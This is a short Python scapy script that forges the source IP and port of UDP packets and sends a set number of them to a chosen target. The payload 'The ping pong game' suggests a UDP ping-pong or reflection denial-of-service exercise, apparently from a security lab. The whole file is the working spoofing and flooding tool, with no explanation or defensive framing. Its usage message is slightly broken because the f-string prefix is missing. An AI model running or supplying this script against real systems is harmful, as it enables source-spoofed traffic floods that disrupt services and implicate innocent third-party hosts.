#!/usr/bin/env python3
import socket
from scapy.all import *
import sys

if len(sys.argv) != 6:
  print("Usage: {sys.argv[0]} <spoof src ip> <spoof src port> <target ip> <target port> <cnt>")
  exit(1)
ip = IP(src=sys.argv[1], dst=sys.argv[3])
udp = UDP(sport=int(sys.argv[2]), dport=int(sys.argv[4]))
cnt=int(sys.argv[5])
data = "The ping pong game\n"

pkt = ip/udp/data
ii = 0;
while ii < cnt:
  send(pkt, verbose=0)
  ii = ii + 1
